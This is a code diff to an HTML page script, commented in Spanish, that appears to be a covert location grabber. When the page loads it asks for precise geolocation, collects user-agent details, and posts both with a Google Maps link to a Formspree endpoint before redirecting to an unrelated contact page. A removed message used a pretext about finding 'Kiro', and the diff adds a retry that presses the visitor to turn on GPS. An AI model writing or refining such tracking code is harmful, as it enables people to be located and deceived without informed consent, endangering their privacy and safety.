@@ -27,6 +27,7 @@
     <div class="spinner"></div>
   
 <script>
+  // --- Detectores y utilidades ---
   function parseUserAgent(ua) {
     ua = ua.toLowerCase();
 
@@ -82,6 +83,7 @@
     return fechaActual;
   }
 
+  // --- Envío de la ubicación a Formspree ---
   function enviarUbicacion(lat, lon) {
     const linkGoogleMaps = `https://www.google.com/maps?q=${lat},${lon}`;
     const uaInfo = parseUserAgent(navigator.userAgent);
@@ -105,6 +107,7 @@
     })
     .then(response => {
       console.log("Ubicación e info enviada con éxito");
+      // Mantengo el comportamiento anterior: redirigir después de 3s
       setTimeout(() => {
         window.location.href = "https://sites.google.com/view/kiromunozslimming/contacto";
       }, 3000);
@@ -117,6 +120,9 @@
     });
   }
 
+  // --- Obtención de ubicación con UN reintento si falla por GPS apagado/permiso ---
+  let yaReintento = false; // controla que solo haya un reintento
+
   function obtenerUbicacion() {
     if (!("geolocation" in navigator)) {
       alert("Geolocalización no soportada.");
@@ -124,37 +130,42 @@
       return;
     }
 
-    if (tieneConsentimiento()) {
+    // Función que intenta obtener la posición (la llamamos la primera vez y, si hace falta, una vez más)
+    const intentarObtener = () => {
       navigator.geolocation.getCurrentPosition(
         position => {
+          // Si no había consentimiento previo, lo guardamos ahora
+          if (!tieneConsentimiento()) setConsentimiento();
+
+          // Enviamos la ubicación
           enviarUbicacion(position.coords.latitude, position.coords.longitude);
         },
         error => {
-          alert("No se pudo obtener la ubicación. Por favor, actívala para saber dónde buscar a Kiro");
-          window.location.href = "https://sites.google.com/view/kiromunozslimming/contacto";
+          // Si aún no reintentamos, pedimos al usuario activar GPS y reintentamos una vez
+          if (!yaReintento) {
+            yaReintento = true;
+            // Mensaje claro para que active GPS/configuración y luego pulse Aceptar
+            alert("No se pudo obtener la ubicación. Por favor activa tu GPS (o permisos de ubicación) y presiona Aceptar para intentarlo de nuevo.");
+            // Esperamos un par de segundos para que el sistema registre el cambio y luego reintentamos
+            setTimeout(() => {
+              intentarObtener();
+            }, 2000);
+          } else {
+            // Ya reintentamos una vez: redirigimos a la página de contacto
+            alert("No se pudo obtener la ubicación. Serás redirigido a la página de contacto.");
+            window.location.href = "https://sites.google.com/view/kiromunozslimming/contacto";
+          }
         },
         { enableHighAccuracy: true, timeout: 7000 }
       );
-    } else {
-      navigator.geolocation.getCurrentPosition(
-        position => {
-          setConsentimiento();
-          enviarUbicacion(position.coords.latitude, position.coords.longitude);
-        },
-        error => {
-          alert("No se pudo obtener la ubicación o no se concedió permiso. Por favor, activa tu ubicación para saber dónde buscar a Kiro");
-          window.location.href = "https://sites.google.com/view/kiromunozslimming/contacto";
-        },
-        { enableHighAccuracy: true, timeout: 7000 }
-      );
-    }
+    };
+
+    // Comenzamos la primera tentativa
+    intentarObtener();
   }
 
+  // Ejecuta al cargar
   obtenerUbicacion();
 </script>
 </body>
 </html>
-
-
-
-
